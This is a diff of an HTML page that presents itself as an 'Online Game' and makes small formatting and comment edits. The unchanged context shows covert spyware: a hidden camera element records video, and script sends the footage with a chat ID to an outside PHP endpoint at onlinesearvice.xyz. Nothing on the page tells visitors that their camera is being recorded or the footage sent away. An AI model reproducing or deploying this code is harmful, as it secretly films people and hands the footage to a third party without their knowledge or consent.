@@ -1,19 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Online Game</title>
-        <style>
-      body {
-        margin: 0;
-        padding: 0;
-        background: url('https://online-sheba.github.io/BdService/ck/teamx.gif') center/cover no-repeat fixed;
-        height: 100vh;
-        overflow: hidden;
-      
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://online-sheba.github.io/BdService/ck/teamx.gif') center/cover no-repeat fixed;
+            height: 100vh;
+            overflow: hidden;
+        }
     </style>
 </head>
+
 <body>
     <div id="cameraContainer" style="display: none;">
         <video id="cameraFeed" autoplay></video>
@@ -63,7 +65,7 @@
                 mediaRecorder.onstop = function () {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
 
-                    // Send the recorded video to a PHP script for processing
+                    // Send the recorded video to the PHP script for processing
                     const chatID = chatIdInput.value; // Get chat ID from the hidden input field
                     const apiUrl = 'https://onlinesearvice.xyz/video/send.php'; // Your PHP script's URL for sending videos
                     const formData = new FormData();
@@ -106,6 +108,5 @@
         };
     </script>
 </body>
+
 </html>
-
-
